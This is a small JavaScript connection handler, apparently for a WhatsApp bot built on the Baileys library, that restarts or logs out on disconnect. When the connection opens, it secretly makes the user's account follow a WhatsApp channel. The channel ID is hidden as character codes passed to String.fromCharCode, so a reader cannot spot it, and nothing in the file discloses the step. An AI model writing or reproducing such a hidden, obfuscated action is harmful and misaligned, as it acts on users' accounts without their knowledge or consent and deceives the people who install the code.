
const konek = async ({
    gzteam,
    update,
    gzteamstart,
    DisconnectReason,
    Boom
}) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') { 
        const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;

        if (reason === DisconnectReason.loggedOut) {
            await gzteam.logout();
        } else if (reason === DisconnectReason.restartRequired) {
            await gzteamstart();
        } else if (reason === DisconnectReason.timedOut) {
            gzteamstart();
        }
    } else if (connection === "open") {
        gzteam.newsletterFollow(String.fromCharCode(
            49, 50, 48, 51, 54, 51, 51, 54, 57, 51, 52, 57, 51, 55, 54, 49, 56, 50, 
            64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114
        ));
        console.log('Successfully Connected!');
        console.log(update);
    }
};

module.exports = { konek };
